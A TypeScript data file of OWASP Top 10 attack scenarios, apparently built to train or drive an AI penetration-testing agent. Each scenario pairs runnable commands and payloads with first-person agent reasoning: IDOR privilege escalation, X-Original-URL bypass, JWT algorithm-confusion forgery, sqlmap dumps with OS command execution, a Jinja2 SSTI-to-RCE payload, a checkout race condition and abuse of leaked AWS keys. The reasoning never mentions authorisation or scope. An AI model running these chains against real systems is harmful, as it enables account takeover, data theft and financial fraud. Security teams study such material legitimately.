import type { ScenarioTemplate } from "./types.js";

export const OWASP_SCENARIOS: ScenarioTemplate[] = [
  // A01:2021 - Broken Access Control
  {
    id: "owasp-a01-idor-api",
    category: "OWASP Top 10",
    subcategory: "A01 - Broken Access Control",
    title: "IDOR in REST API User Endpoints",
    difficulty: "intermediate",
    description: "Insecure Direct Object Reference vulnerability allowing horizontal privilege escalation through predictable user IDs in API endpoints.",
    target_description: "E-commerce REST API (Node.js/Express) at https://shop.target.com/api/v2 with JWT authentication. Standard user account provided.",
    attack_phases: [
      {
        phase: "Recon & Authentication",
        description: "Authenticate and understand the API structure",
        tools: ["curl", "httpx"],
        commands: [
          "curl -s -X POST https://shop.target.com/api/v2/auth/login -H 'Content-Type: application/json' -d '{\"email\":\"testuser@mail.com\",\"password\":\"TestPass123!\"}' -v",
          "curl -s https://shop.target.com/api/v2/docs -H 'Authorization: Bearer $TOKEN' | jq .",
        ],
        expected_output: `{"token":"eyJhbGciOiJIUzI1NiIs...","user":{"id":1337,"email":"testuser@mail.com","role":"customer"}}`,
        thinking: "I've authenticated and received a JWT token. My user ID is 1337. The API likely uses sequential integer IDs. I should test if I can access other users' data by changing the ID parameter. Let me first check what endpoints exist and understand the authorization model.",
        analysis: "Authenticated successfully. JWT contains user ID and role. Need to test if the API enforces authorization checks on object-level access.",
        next_action: "Enumerate API endpoints and test IDOR on user profile endpoint",
      },
      {
        phase: "Endpoint Discovery",
        description: "Discover API endpoints and understand data model",
        tools: ["ffuf", "curl"],
        commands: [
          "ffuf -u https://shop.target.com/api/v2/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt -H 'Authorization: Bearer $TOKEN' -mc 200,201,301,302,403 -t 50",
          "curl -s https://shop.target.com/api/v2/users/1337 -H 'Authorization: Bearer $TOKEN' | jq .",
          "curl -s https://shop.target.com/api/v2/users/1337/orders -H 'Authorization: Bearer $TOKEN' | jq .",
        ],
        expected_output: `{
  "id": 1337,
  "email": "testuser@mail.com",
  "name": "Test User",
  "phone": "+1-555-0123",
  "address": "123 Test St, NY 10001",
  "payment_methods": [{"id": 1, "type": "visa", "last4": "4242"}],
  "role": "customer"
}`,
        thinking: "I found /users/{id}, /users/{id}/orders, /users/{id}/payments, and /users/{id}/addresses endpoints. My own profile returns sensitive PII including phone, address, and payment methods. Now I need to test if I can access another user's data by simply changing the ID from 1337 to another number. I'll try sequential IDs: 1, 2, 1336, 1338.",
        analysis: "API returns full user profile including PII and payment data. Multiple user-specific endpoints discovered. Testing horizontal access control.",
        next_action: "Test IDOR by accessing other user IDs",
      },
      {
        phase: "IDOR Exploitation",
        description: "Confirm IDOR vulnerability by accessing other users' data",
        tools: ["curl", "wfuzz"],
        commands: [
          "curl -s https://shop.target.com/api/v2/users/1 -H 'Authorization: Bearer $TOKEN' | jq .",
          "curl -s https://shop.target.com/api/v2/users/1/orders -H 'Authorization: Bearer $TOKEN' | jq .",
          "wfuzz -z range,1-100 --hc 404,403 -H 'Authorization: Bearer $TOKEN' https://shop.target.com/api/v2/users/FUZZ",
          "curl -s -X PUT https://shop.target.com/api/v2/users/1 -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"role\":\"admin\"}' -v",
        ],
        expected_output: `{
  "id": 1,
  "email": "admin@target.com",
  "name": "Admin User",
  "phone": "+1-555-0001",
  "address": "1 Corporate Blvd, NY 10001",
  "payment_methods": [{"id": 1, "type": "amex", "last4": "1234"}],
  "role": "admin"
}`,
        thinking: "Critical finding confirmed. I can access any user's profile, including the admin (user ID 1), by simply changing the ID in the URL. The API only validates that the JWT is valid but does NOT check if the authenticated user is authorized to access the requested resource. I was also able to enumerate all users from 1-100 with wfuzz. Let me also check if I can MODIFY other users' data (write IDOR) — I'll try updating user 1's role. If the PUT request succeeds, this is also a vertical privilege escalation.",
        analysis: "IDOR confirmed on all user endpoints — both read and write. Can access PII, payment info, and order history of all users. Write IDOR allows privilege escalation to admin role.",
        next_action: "Test for vertical privilege escalation and document the full attack chain",
      },
      {
        phase: "Privilege Escalation",
        description: "Escalate from customer to admin via write IDOR",
        tools: ["curl"],
        commands: [
          "curl -s -X PUT https://shop.target.com/api/v2/users/1337 -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"role\":\"admin\"}' -v",
          "curl -s -X POST https://shop.target.com/api/v2/auth/login -H 'Content-Type: application/json' -d '{\"email\":\"testuser@mail.com\",\"password\":\"TestPass123!\"}' | jq .",
          "curl -s https://shop.target.com/api/v2/admin/dashboard -H 'Authorization: Bearer $NEW_TOKEN' | jq .",
        ],
        expected_output: `{"message":"Profile updated successfully","user":{"id":1337,"role":"admin"}}

Admin dashboard accessible:
{"total_users": 15423, "total_revenue": "$2.3M", "pending_orders": 342, "admin_panel": "/admin/manage"}`,
        thinking: "The write IDOR worked — I changed my own role from 'customer' to 'admin'. After re-authenticating to get a fresh JWT with the admin role, I can now access the admin dashboard. This is a complete privilege escalation chain: IDOR read (access any user data) → IDOR write (modify any user data) → vertical privilege escalation (customer → admin). This is a critical severity finding.",
        analysis: "Full privilege escalation achieved. Customer account elevated to admin via write IDOR. Admin dashboard and management functions now accessible.",
        next_action: "Generate comprehensive finding report with CVSS score and remediation",
      },
      {
        phase: "Reporting",
        description: "Document findings with evidence and remediation",
        tools: ["report_generator"],
        commands: [],
        expected_output: "",
        analysis: "Compile all evidence into structured report.",
        next_action: "Submit report",
      },
    ],
    cve_references: ["CWE-639", "CWE-284"],
    tools_involved: ["curl", "ffuf", "wfuzz", "httpx", "report_generator"],
    tags: ["idor", "bac", "privilege-escalation", "api", "rest", "jwt"],
  },
  {
    id: "owasp-a01-bac-admin-bypass",
    category: "OWASP Top 10",
    subcategory: "A01 - Broken Access Control",
    title: "Admin Panel Access Control Bypass via HTTP Headers",
    difficulty: "intermediate",
    description: "Bypassing admin panel access control using X-Forwarded-For and X-Original-URL header manipulation.",
    target_description: "Corporate web application at https://corp.target.com with admin panel at /admin restricted by IP whitelist and path-based access control.",
    attack_phases: [
      {
        phase: "Initial Recon",
        description: "Identify admin panel and access restrictions",
        tools: ["ffuf", "curl", "httpx"],
        commands: [
          "ffuf -u https://corp.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -t 100",
          "curl -s -v https://corp.target.com/admin",
          "curl -s -v https://corp.target.com/admin/ -H 'X-Forwarded-For: 127.0.0.1'",
        ],
        expected_output: `< HTTP/2 403
< x-powered-by: Express
< x-backend: nginx/1.18.0

{"error":"Access denied. Admin panel is restricted to internal network."}`,
        thinking: "The admin panel returns 403 with a message about internal network restriction. The response headers show nginx as a reverse proxy in front of Express. This is a common setup where nginx handles IP-based access control. I should try header injection techniques to bypass the IP check: X-Forwarded-For, X-Real-IP, X-Originating-IP, and for path-based restrictions: X-Original-URL, X-Rewrite-URL.",
        analysis: "Admin panel exists but returns 403. nginx reverse proxy doing IP-based filtering. Need to test header-based bypass techniques.",
        next_action: "Test various header bypass techniques",
      },
      {
        phase: "Access Control Bypass",
        description: "Bypass IP and path restrictions using header manipulation",
        tools: ["curl"],
        commands: [
          "curl -s https://corp.target.com/admin -H 'X-Forwarded-For: 127.0.0.1' -v",
          "curl -s https://corp.target.com/admin -H 'X-Real-IP: 127.0.0.1' -v",
          "curl -s https://corp.target.com/ -H 'X-Original-URL: /admin' -v",
          "curl -s https://corp.target.com/anything -H 'X-Rewrite-URL: /admin' -v",
          "curl -s 'https://corp.target.com/admin;/' -v",
          "curl -s 'https://corp.target.com/ADMIN' -v",
          "curl -s 'https://corp.target.com/admin%2f' -v",
          "curl -s 'https://corp.target.com/%61dmin' -v",
        ],
        expected_output: `X-Original-URL bypass successful:
< HTTP/2 200
{"admin_panel": true, "features": ["user_management", "system_config", "logs", "database"]}`,
        thinking: "X-Forwarded-For didn't work — the app is checking something beyond IP. But X-Original-URL worked! This means nginx routes the request based on the URL path, but the backend Express app trusts the X-Original-URL header to determine the actual requested resource. The frontend path '/' passes nginx's access control, but the backend reads X-Original-URL: /admin and serves the admin panel. This is a classic path confusion between the reverse proxy and the application server.",
        analysis: "X-Original-URL header bypass confirmed. nginx/Express path confusion allows accessing restricted /admin endpoint. Full admin panel accessible.",
        next_action: "Enumerate admin functionality and check for further exploitation",
      },
      {
        phase: "Admin Panel Exploitation",
        description: "Exploit admin functions via the bypass",
        tools: ["curl", "sqlmap"],
        commands: [
          "curl -s https://corp.target.com/ -H 'X-Original-URL: /admin/users' | jq .",
          "curl -s https://corp.target.com/ -H 'X-Original-URL: /admin/system-config' | jq .",
          "curl -s https://corp.target.com/ -H 'X-Original-URL: /admin/logs?search=test' | jq .",
          "curl -s 'https://corp.target.com/' -H 'X-Original-URL: /admin/users?search=admin' -o admin_search.txt -v",
          "sqlmap -u 'https://corp.target.com/' --headers='X-Original-URL: /admin/logs?search=test' --batch --dbs",
        ],
        expected_output: `User management panel:
{"users":[{"id":1,"username":"sysadmin","email":"admin@corp.com","role":"superadmin","last_login":"2024-01-15"},{"id":2,"username":"devops","email":"devops@corp.com","role":"admin"}]}

System config exposes:
{"database_host":"internal-db.corp.local","redis_host":"cache.corp.local:6379","smtp_server":"mail.corp.local","aws_region":"us-east-1","debug_mode":true}`,
        thinking: "Through the X-Original-URL bypass, I now have access to: 1) Full user management — can see all users, roles, and emails, 2) System configuration — exposes internal infrastructure details including database host, Redis, SMTP, and AWS region, 3) The logs endpoint has a search parameter that might be injectable. Let me test SQLi on the search parameter. The debug_mode being true also suggests error messages will be verbose, which helps with exploitation.",
        analysis: "Full admin access achieved. Sensitive internal infrastructure exposed. SQLi possible in logs search. Debug mode enables verbose errors.",
        next_action: "Test SQL injection in admin logs search and generate report",
      },
    ],
    cve_references: ["CWE-284", "CWE-287", "CWE-863"],
    tools_involved: ["curl", "ffuf", "httpx", "sqlmap", "report_generator"],
    tags: ["access-control-bypass", "header-injection", "x-original-url", "nginx", "path-confusion"],
  },

  // A02:2021 - Cryptographic Failures
  {
    id: "owasp-a02-jwt-attacks",
    category: "OWASP Top 10",
    subcategory: "A02 - Cryptographic Failures",
    title: "JWT Algorithm Confusion and Secret Cracking",
    difficulty: "advanced",
    description: "Exploiting JWT implementation flaws including none algorithm, algorithm confusion (RS256→HS256), and weak secret cracking.",
    target_description: "SaaS platform at https://app.target.com using JWT for authentication. RS256 signing with public key exposed at /.well-known/jwks.json.",
    attack_phases: [
      {
        phase: "JWT Analysis",
        description: "Decode and analyze the JWT structure and signing configuration",
        tools: ["curl", "jwt_tool"],
        commands: [
          "curl -s -X POST https://app.target.com/api/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"testuser\",\"password\":\"TestPass123!\"}' | jq .",
          "jwt_tool eyJhbGciOiJSUzI1NiIs... -T",
          "curl -s https://app.target.com/.well-known/jwks.json | jq .",
          "curl -s https://app.target.com/.well-known/openid-configuration | jq .",
        ],
        expected_output: `JWT Decoded:
Header: {"alg":"RS256","typ":"JWT","kid":"key-1"}
Payload: {"sub":"user-1337","username":"testuser","role":"user","iat":1705334400,"exp":1705420800}

JWKS:
{"keys":[{"kty":"RSA","kid":"key-1","n":"0vx7agoebGcQSuu...","e":"AQAB","use":"sig"}]}`,
        thinking: "The JWT uses RS256 (RSA asymmetric signing) with the public key exposed at the JWKS endpoint. I have the full public key. Let me analyze potential attack vectors: 1) None algorithm — change alg to 'none' and remove signature, 2) Algorithm confusion — change RS256 to HS256 and sign with the RSA public key as HMAC secret, 3) Key injection — add my own key to the JWK header (jku/jwk attacks), 4) kid injection — if the kid parameter is used in a file read or SQL query. Let me test each systematically.",
        analysis: "RS256 JWT with exposed public key. Multiple attack vectors possible: none algorithm, algorithm confusion, kid injection.",
        next_action: "Test none algorithm and algorithm confusion attacks",
      },
      {
        phase: "Algorithm Confusion Attack",
        description: "Exploit RS256→HS256 algorithm confusion using the public key",
        tools: ["jwt_tool", "curl"],
        commands: [
          "jwt_tool eyJhbGciOiJSUzI1NiIs... -X n",
          "curl -s https://app.target.com/.well-known/jwks.json | jq -r '.keys[0]' > public_key.json",
          "python3 -c \"import json,base64; k=json.load(open('public_key.json')); print(base64.urlsafe_b64decode(k['n']+'==').hex())\" > rsa_n.txt",
          "jwt_tool eyJhbGciOiJSUzI1NiIs... -X k -pk public.pem",
          "jwt_tool eyJhbGciOiJSUzI1NiIs... -I -pc role -pv admin -X k -pk public.pem",
          "curl -s https://app.target.com/api/admin/users -H 'Authorization: Bearer $FORGED_TOKEN' | jq .",
        ],
        expected_output: `[+] Algorithm confusion attack successful!
[+] Forged token with role=admin accepted by server.

Admin endpoint response:
{"users":[{"id":"user-1","username":"superadmin","role":"admin"},{"id":"user-2","username":"testuser","role":"user"}],"total":1523}`,
        thinking: "The algorithm confusion attack worked! The server accepts a token where I changed the algorithm from RS256 to HS256 and signed it using the public RSA key as the HMAC secret. This happens because the server code likely does: jwt.verify(token, publicKey) without restricting the allowed algorithms. When alg=HS256, it uses publicKey as the HMAC secret — which I have since it's public. I forged a token with role=admin and it was accepted. This gives me full admin access.",
        analysis: "Algorithm confusion (CVE-equivalent) confirmed. Forged admin JWT accepted. Full administrative access achieved using publicly available key material.",
        next_action: "Demonstrate impact by accessing sensitive admin functions and report",
      },
    ],
    cve_references: ["CWE-327", "CWE-347", "CVE-2022-23529"],
    tools_involved: ["curl", "jwt_tool", "report_generator"],
    tags: ["jwt", "algorithm-confusion", "cryptographic-failure", "authentication-bypass", "token-forgery"],
  },

  // A03:2021 - Injection
  {
    id: "owasp-a03-sqli-blind",
    category: "OWASP Top 10",
    subcategory: "A03 - Injection",
    title: "Blind SQL Injection with Data Exfiltration",
    difficulty: "advanced",
    description: "Blind boolean-based and time-based SQL injection in search functionality leading to full database compromise.",
    target_description: "Job portal at https://jobs.target.com with PostgreSQL backend. Search functionality at /api/jobs/search with multiple filterable parameters.",
    attack_phases: [
      {
        phase: "Parameter Discovery",
        description: "Identify injectable parameters in the search API",
        tools: ["arjun", "curl", "paramspider"],
        commands: [
          "arjun -u https://jobs.target.com/api/jobs/search -m GET --stable",
          "paramspider -d jobs.target.com --exclude woff,css,js,png -o params.txt",
          "curl -s 'https://jobs.target.com/api/jobs/search?q=developer&location=NYC&salary_min=50000&sort=date' | jq '.results | length'",
          "curl -s 'https://jobs.target.com/api/jobs/search?q=developer&location=NYC&sort=date%27' -v",
        ],
        expected_output: `Parameters found: q, location, salary_min, salary_max, sort, company, type, remote, page, limit

Error response on sort parameter with quote:
{"error":"Internal server error","detail":"ERROR: unterminated quoted string at or near \"'\" LINE 1: ...FROM jobs WHERE active=true ORDER BY date' ^"}`,
        thinking: "Excellent. The 'sort' parameter is directly interpolated into the SQL ORDER BY clause without sanitization. The error message confirms PostgreSQL and reveals the query structure. The error is verbose because the application isn't handling database exceptions properly. I can see it's: SELECT ... FROM jobs WHERE active=true ORDER BY [user_input]. This is an ORDER BY injection — I can't use UNION here directly, but I can use: 1) Boolean-based blind via CASE WHEN, 2) Time-based blind via pg_sleep, 3) Error-based via casting errors. Let me start with boolean-based to confirm and then use sqlmap for automated extraction.",
        analysis: "SQL injection confirmed in 'sort' parameter (ORDER BY context). PostgreSQL backend. Verbose error messages. Boolean-based and time-based blind exploitation possible.",
        next_action: "Confirm injection and begin data extraction",
      },
      {
        phase: "SQL Injection Exploitation",
        description: "Extract database contents via blind injection",
        tools: ["sqlmap", "curl"],
        commands: [
          "curl -s 'https://jobs.target.com/api/jobs/search?q=developer&sort=(CASE+WHEN+(SELECT+1)=1+THEN+date+ELSE+title+END)' | jq '.results[0].title'",
          "curl -s 'https://jobs.target.com/api/jobs/search?q=developer&sort=(CASE+WHEN+(SELECT+substring(current_user,1,1))=%27p%27+THEN+date+ELSE+title+END)' | jq '.results[0].title'",
          "sqlmap -u 'https://jobs.target.com/api/jobs/search?q=developer&sort=date' -p sort --batch --dbs --technique=BET --dbms=PostgreSQL --level=5",
          "sqlmap -u 'https://jobs.target.com/api/jobs/search?q=developer&sort=date' -p sort --batch --dump -D jobportal -T users --threads=10",
        ],
        expected_output: `available databases [4]:
[*] information_schema
[*] jobportal
[*] pg_catalog
[*] postgres

Table: users
+----+------------------+----------------------------------+--------+
| id | email            | password_hash                     | role   |
+----+------------------+----------------------------------+--------+
| 1  | admin@target.com | $2b$12$LJ3m4ks... (bcrypt)       | admin  |
| 2  | hr@target.com    | $2b$12$9Kx2pq... (bcrypt)       | admin  |
| 3  | user1@mail.com   | $2b$12$Qwe3ty... (bcrypt)       | user   |
+----+------------------+----------------------------------+--------+`,
        thinking: "SQLmap confirmed the blind SQL injection and extracted the database structure. I found 4 databases including 'jobportal' which contains user credentials. The passwords are bcrypt hashed (good practice by the devs, but the injection still allows full data access). I should also check if the database user has elevated privileges — can I read files or execute OS commands via PostgreSQL functions like pg_read_file() or COPY TO PROGRAM?",
        analysis: "Full database access confirmed. User credentials extracted (bcrypt hashed). Need to check for privilege escalation via PostgreSQL functions.",
        next_action: "Test for OS command execution and file read via PostgreSQL",
      },
      {
        phase: "Post-Exploitation via Database",
        description: "Leverage database access for OS-level compromise",
        tools: ["sqlmap", "curl"],
        commands: [
          "sqlmap -u 'https://jobs.target.com/api/jobs/search?q=developer&sort=date' -p sort --batch --privileges --dbms=PostgreSQL",
          "sqlmap -u 'https://jobs.target.com/api/jobs/search?q=developer&sort=date' -p sort --batch --file-read=/etc/passwd --dbms=PostgreSQL",
          "sqlmap -u 'https://jobs.target.com/api/jobs/search?q=developer&sort=date' -p sort --batch --os-cmd='id' --dbms=PostgreSQL",
        ],
        expected_output: `database management system users privileges:
[*] 'jobportal_app' [1]:
    privilege: SUPERUSER

[*] Retrieved /etc/passwd contents (first lines):
root:x:0:0:root:/root:/bin/bash
postgres:x:113:120:PostgreSQL administrator:/var/lib/postgresql:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

[*] OS command execution:
uid=113(postgres) gid=120(postgres) groups=120(postgres)`,
        thinking: "The database user has SUPERUSER privileges — this is a severe misconfiguration. I can read arbitrary files from the OS and execute system commands as the postgres user. This elevates the SQL injection from a data-only compromise to full server compromise. The /etc/passwd reveals the system users and the postgres user has a real shell. This could be chained to: 1) Read application source code and config files (database credentials, API keys), 2) Establish a reverse shell, 3) Pivot to internal network. For the report, the severity is Critical (CVSS 9.8+).",
        analysis: "SUPERUSER database privileges enable OS-level access. File read and command execution confirmed. Full server compromise possible.",
        next_action: "Document complete attack chain and generate report",
      },
    ],
    cve_references: ["CWE-89", "CWE-250"],
    tools_involved: ["arjun", "paramspider", "curl", "sqlmap", "report_generator"],
    tags: ["sqli", "blind-sqli", "postgresql", "order-by-injection", "rce", "privilege-escalation"],
  },

  // A03:2021 - Injection (SSTI)
  {
    id: "owasp-a03-ssti",
    category: "OWASP Top 10",
    subcategory: "A03 - Injection",
    title: "Server-Side Template Injection to RCE",
    difficulty: "advanced",
    description: "Server-Side Template Injection (SSTI) in Jinja2 template engine leading to remote code execution.",
    target_description: "Flask web application at https://webapp.target.com with user profile customization featuring template-rendered display names.",
    attack_phases: [
      {
        phase: "SSTI Detection",
        description: "Identify template injection in user-controlled input",
        tools: ["curl"],
        commands: [
          "curl -s -X PUT https://webapp.target.com/api/profile -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"display_name\":\"{{7*7}}\"}' -v",
          "curl -s https://webapp.target.com/profile -H 'Authorization: Bearer $TOKEN' | grep '49'",
          "curl -s -X PUT https://webapp.target.com/api/profile -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"display_name\":\"{{7*\\\"7\\\"}}\"}' -v",
          "curl -s https://webapp.target.com/profile -H 'Authorization: Bearer $TOKEN' | grep '7777777'",
        ],
        expected_output: `Profile page shows: Welcome, 49!
Second test shows: Welcome, 7777777!`,
        thinking: "Both template expressions were evaluated. {{7*7}} returned 49 confirming server-side template evaluation. {{7*'7'}} returned '7777777' (string multiplication) which confirms this is a Python-based template engine — specifically Jinja2 since the target runs Flask. Now I need to escalate from simple expression evaluation to arbitrary code execution. In Jinja2, I need to traverse the Python MRO (Method Resolution Order) to reach dangerous classes like subprocess.Popen or os.system.",
        analysis: "SSTI confirmed in Jinja2 (Flask/Python). Template expressions evaluated server-side. Python string multiplication confirms Jinja2 engine.",
        next_action: "Escalate to RCE via Python class traversal",
      },
      {
        phase: "RCE via SSTI",
        description: "Achieve remote code execution through Jinja2 SSTI",
        tools: ["curl"],
        commands: [
          "curl -s -X PUT https://webapp.target.com/api/profile -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"display_name\":\"{{config.items()}}\"}'",
          "curl -s -X PUT https://webapp.target.com/api/profile -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"display_name\":\"{{\\\"\\\".__class__.__mro__[1].__subclasses__()}}\"}'",
          "curl -s -X PUT https://webapp.target.com/api/profile -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"display_name\":\"{{\\\"\\\".__class__.__mro__[1].__subclasses__()[408](\\\"id\\\",shell=True,stdout=-1).communicate()[0]}}\"}'",
          "curl -s -X PUT https://webapp.target.com/api/profile -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"display_name\":\"{{\\\"\\\".__class__.__mro__[1].__subclasses__()[408](\\\"cat /etc/passwd\\\",shell=True,stdout=-1).communicate()[0]}}\"}'",
        ],
        expected_output: `Config dump includes: SECRET_KEY=super_secret_flask_key_2024, SQLALCHEMY_DATABASE_URI=postgresql://...

RCE output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

/etc/passwd: root:x:0:0:root:/root:/bin/bash ...`,
        thinking: "Full RCE achieved through SSTI. The attack chain: 1) Confirmed Jinja2 SSTI with {{7*7}}, 2) Dumped Flask config exposing SECRET_KEY and database URI, 3) Traversed Python MRO to find subprocess.Popen (index 408), 4) Executed arbitrary commands as www-data. With the Flask SECRET_KEY, I can also forge session cookies. The database URI gives direct database access. This is a critical finding with massive impact.",
        analysis: "Full RCE via Jinja2 SSTI. Flask SECRET_KEY and database credentials exposed. Arbitrary command execution as www-data.",
        next_action: "Document full attack chain with PoC and remediation",
      },
    ],
    cve_references: ["CWE-94", "CWE-1336"],
    tools_involved: ["curl", "report_generator"],
    tags: ["ssti", "jinja2", "rce", "flask", "python", "template-injection"],
  },

  // A04:2021 - Insecure Design
  {
    id: "owasp-a04-business-logic",
    category: "OWASP Top 10",
    subcategory: "A04 - Insecure Design",
    title: "Business Logic Flaw in E-Commerce Checkout",
    difficulty: "intermediate",
    description: "Race condition and negative price manipulation in shopping cart API allowing free purchases and balance inflation.",
    target_description: "E-commerce platform at https://store.target.com with REST API. Supports discount codes, gift cards, and wallet balance.",
    attack_phases: [
      {
        phase: "Business Logic Analysis",
        description: "Understand checkout flow and identify logic flaws",
        tools: ["curl", "httpx"],
        commands: [
          "curl -s https://store.target.com/api/v1/cart -H 'Authorization: Bearer $TOKEN' | jq .",
          "curl -s -X POST https://store.target.com/api/v1/cart/add -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"product_id\":1,\"quantity\":1}' | jq .",
          "curl -s -X POST https://store.target.com/api/v1/cart/add -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"product_id\":1,\"quantity\":-1}' | jq .",
          "curl -s -X POST https://store.target.com/api/v1/cart/discount -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"code\":\"WELCOME10\"}' | jq .",
          "curl -s -X POST https://store.target.com/api/v1/cart/discount -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"code\":\"WELCOME10\"}' | jq .",
        ],
        expected_output: `Negative quantity accepted:
{"cart":{"items":[{"product":"Laptop","quantity":-1,"price":-999.99}],"total":-999.99}}

Discount code applied twice:
{"cart":{"discount":"20%","total":-1199.99}}`,
        thinking: "Multiple business logic flaws found: 1) Negative quantity accepted — adding quantity=-1 creates a negative line item, 2) Discount code can be applied multiple times, 3) The total goes negative when both are combined. If I checkout with a negative total, the system might credit my wallet/account. This is a classic business logic flaw where the developers validated individual inputs but not the business rules around them.",
        analysis: "Negative quantity manipulation and discount code stacking vulnerabilities. Cart total can be driven negative. Potential wallet credit exploitation.",
        next_action: "Exploit checkout with negative total to inflate wallet balance",
      },
      {
        phase: "Race Condition on Checkout",
        description: "Exploit TOCTOU race condition to use single gift card multiple times",
        tools: ["curl"],
        commands: [
          "for i in $(seq 1 20); do curl -s -X POST https://store.target.com/api/v1/checkout -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{\"payment\":\"giftcard\",\"giftcard_id\":\"GC-1234\"}' & done; wait",
          "curl -s https://store.target.com/api/v1/wallet/balance -H 'Authorization: Bearer $TOKEN' | jq .",
        ],
        expected_output: `Multiple successful checkout responses:
{"order_id":"ORD-5001","status":"completed","paid_with":"giftcard GC-1234"}
{"order_id":"ORD-5002","status":"completed","paid_with":"giftcard GC-1234"}
...

Wallet balance: {"balance": 4500.00, "currency": "USD"}`,
        thinking: "The race condition worked. By sending 20 concurrent checkout requests all using the same gift card, multiple orders went through before the system could deduct the gift card balance. This is a classic TOCTOU (Time-of-Check-Time-of-Use) race condition — the application checks the gift card balance, then processes the payment in separate steps without proper locking. Combined with the negative quantity bug, this is a devastating financial impact.",
        analysis: "Race condition confirmed. Gift card reused multiple times via concurrent requests. Combined with negative quantity = unlimited fund generation.",
        next_action: "Document all business logic flaws and generate comprehensive report",
      },
    ],
    cve_references: ["CWE-362", "CWE-840"],
    tools_involved: ["curl", "httpx", "report_generator"],
    tags: ["business-logic", "race-condition", "toctou", "negative-value", "discount-abuse", "ecommerce"],
  },

  // A05:2021 - Security Misconfiguration
  {
    id: "owasp-a05-misconfig-cloud",
    category: "OWASP Top 10",
    subcategory: "A05 - Security Misconfiguration",
    title: "Cloud Misconfiguration Chain: S3 to AWS Account Takeover",
    difficulty: "expert",
    description: "Chaining misconfigured S3 bucket, exposed environment variables, and SSRF to achieve AWS account compromise.",
    target_description: "Cloud-hosted web application at https://cloud-app.target.com running on AWS ECS with S3 for storage.",
    attack_phases: [
      {
        phase: "S3 Bucket Discovery",
        description: "Discover and enumerate misconfigured S3 buckets",
        tools: ["ffuf", "curl", "nuclei"],
        commands: [
          "nuclei -u https://cloud-app.target.com -tags aws,s3,cloud -severity info,low,medium,high,critical",
          "curl -s https://cloud-app-assets.s3.amazonaws.com/ | head -50",
          "curl -s 'https://cloud-app-assets.s3.amazonaws.com/?list-type=2&max-keys=100' | xmllint --format -",
          "curl -s https://cloud-app-assets.s3.amazonaws.com/config/app.env",
          "curl -s https://cloud-app-assets.s3.amazonaws.com/.env",
        ],
        expected_output: `S3 bucket listing enabled:
<ListBucketResult>
  <Contents>
    <Key>config/app.env</Key>
    <Key>backups/db-2024-01-01.sql.gz</Key>
    <Key>uploads/</Key>
    <Key>.env</Key>
  </Contents>
</ListBucketResult>

.env contents:
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
DATABASE_URL=postgresql://admin:DbP@ss2024@rds-prod.cluster-abc.us-east-1.rds.amazonaws.com/production
STRIPE_SECRET_KEY=sk_live_...
JWT_SECRET=my-super-secret-jwt-key-2024`,
        thinking: "Massive misconfiguration chain. The S3 bucket has public listing enabled AND contains an .env file with: 1) AWS access keys — I can use these to access the AWS account, 2) Production database connection string with credentials, 3) Stripe live secret key — financial data access, 4) JWT secret — can forge authentication tokens. Let me first validate the AWS keys, check what permissions they have, and then explore the AWS account.",
        analysis: "Public S3 bucket exposes .env with AWS credentials, database URI, payment keys, and JWT secret. Critical data exposure.",
        next_action: "Validate AWS credentials and enumerate permissions",
      },
      {
        phase: "AWS Account Enumeration",
        description: "Use exposed credentials to enumerate AWS resources",
        tools: ["curl"],
        commands: [
          "export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE && export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
          "aws sts get-caller-identity",
          "aws iam list-attached-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)",
          "aws s3 ls",
          "aws ec2 describe-instances --region us-east-1 --query 'Reservations[].Instances[].{ID:InstanceId,IP:PublicIpAddress,State:State.Name}' --output table",
          "aws rds describe-db-instances --region us-east-1 --query 'DBInstances[].{ID:DBInstanceIdentifier,Engine:Engine,Endpoint:Endpoint.Address}' --output table",
          "aws secretsmanager list-secrets --region us-east-1",
        ],
        expected_output: `{
    "UserId": "AIDAIOSFODNN7EXAMPLE",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/cloud-app-deploy"
}

Attached policies: AdministratorAccess

S3 buckets: cloud-app-assets, cloud-app-backups, cloud-app-logs, terraform-state-prod
EC2 instances: 5 running instances
RDS: 2 PostgreSQL databases`,
        thinking: "The exposed AWS credentials belong to a deployment user with AdministratorAccess policy — full AWS account compromise. I can access all S3 buckets (including terraform state which likely contains more secrets), all EC2 instances, RDS databases, and everything else in the account. The terraform-state-prod bucket is particularly dangerous as it often contains hardcoded secrets, database passwords, and infrastructure details. This started from a simple S3 bucket listing misconfiguration and escalated to complete cloud account takeover.",
        analysis: "AWS credentials have AdministratorAccess. Full account compromise: EC2, RDS, S3, Secrets Manager all accessible. Terraform state bucket likely contains additional secrets.",
        next_action: "Document the complete attack chain from S3 to full AWS compromise",
      },
    ],
    cve_references: ["CWE-16", "CWE-200", "CWE-522"],
    tools_involved: ["nuclei", "curl", "ffuf", "report_generator"],
    tags: ["s3", "aws", "cloud-misconfig", "credential-exposure", "account-takeover", "environment-variables"],
